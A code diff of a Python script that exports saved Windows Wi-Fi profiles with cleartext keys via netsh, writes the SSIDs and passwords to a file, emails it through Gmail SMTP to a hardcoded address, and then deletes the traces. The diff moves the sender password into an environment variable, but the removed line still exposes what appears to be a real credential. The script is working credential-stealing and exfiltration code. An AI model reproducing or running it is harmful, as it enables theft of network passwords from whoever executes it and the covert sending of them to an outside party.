@@ -2,13 +2,16 @@ import os,subprocess,tempfile,smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
+from dotenv import load_dotenv
 
+
+load_dotenv()
 
 def file_extractor():
     path = os.getcwd()
     command = ["netsh", "wlan", "export", "profile", "key=clear"]
     subprocess.run(command,shell=True, capture_output=True).stdout.decode()
-    return path 
+    return path
 
 
 def append_file(path):
@@ -44,18 +47,18 @@ def make_doc(zip_file):
     for file in os.listdir(path):
         if file.startswith("wi_fi_password") and file.endswith(".txt"):
             os.remove(path+"\\"+file)
-    
+
     for id,pwd in zip_file:
         with open(filename,"a") as doc:
             doc.write(f"SSID: {id} --------------- Password: {pwd}\n")
-    
+
     return doc.name
 
 
 def send_email(document):
     # Sender and receiver information
     sender_email = "akjani2311@gmail.com"
-    sender_password = "Jani@3335"
+    sender_password = os.getenv("GMAIL_APP_PASSWORD")
     receiver_email = "akjani2311@gmail.com"
 
     # Create a message object
@@ -93,7 +96,7 @@ def send_email(document):
     finally:
         server.quit()
 
-# deleting all the extracted file 
+# deleting all the extracted file
 def delete_files(path):
     os.chdir(path)
     for file in os.listdir(path):
@@ -113,5 +116,5 @@ def execute():
     send_email(document)
     # deleting extracted file after extracting ssid and password
     delete_files(path)
-    # finnaly removing document 
+    # finnaly removing document
     os.remove(document)
